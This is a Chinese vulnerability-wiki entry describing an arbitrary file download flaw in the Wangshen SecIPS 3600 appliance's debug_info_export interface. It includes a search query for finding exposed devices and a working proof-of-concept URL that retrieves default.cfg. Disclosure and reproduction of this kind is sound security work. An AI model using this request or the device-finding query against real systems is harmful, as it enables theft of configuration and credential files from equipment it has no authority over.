---
title: "网神 SecIPS 3600 debug_info_export 任意文件下载漏洞"
date: 2026-10-18 09:16:44
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "网神-SecIPS"
tags:
  - "网神-SecIPS"
  - "任意文件下载"
  - "漏洞复现"
---
## 漏洞描述

网神 SecIPS 3600 debug_info_export接口存在任意文件下载漏洞，攻击者通过漏洞可以获取服务器敏感文件

## 漏洞影响

```
网神 SecIPS 3600
```

## 网络测绘

```
app="网神-SecIPS"
```

## 漏洞复现

登录页面

![image-20230314090018282](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230314090018282.png)

验证POC

```
/webui/debug/debug_info_export?filename=default.cfg
```

![image-20230314090033658](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230314090033658.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E7%BD%91%E7%A5%9E-SecIPS-3600-debug_info_export-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md)
